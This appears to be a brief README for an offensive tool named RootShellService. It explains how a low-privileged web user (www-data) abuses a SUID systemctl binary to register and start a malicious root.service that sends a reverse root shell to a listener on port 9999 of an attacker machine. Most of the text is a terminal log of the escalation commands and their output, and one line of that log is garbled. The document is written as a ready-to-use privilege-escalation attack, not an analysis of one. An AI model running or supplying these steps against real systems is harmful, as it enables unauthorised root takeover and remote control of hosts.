# RootShellService
Linux Service for Getting Root shell from systemctl SUID

Listen on port 9999 of attacker machine for reverse root shell.

www-data@machine:/tmp/melbin$ systemctl enable /tmp/melbin/root.service    
<p/melbin$ systemctl enable /tmp/melbin/root.service                         
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /tmp/melbin/root.service.
Created symlink from /etc/systemd/system/root.service to /tmp/melbin/root.service.
www-data@machine:/tmp/melbin$ systemctl start root
systemctl start root
www-data@machine:

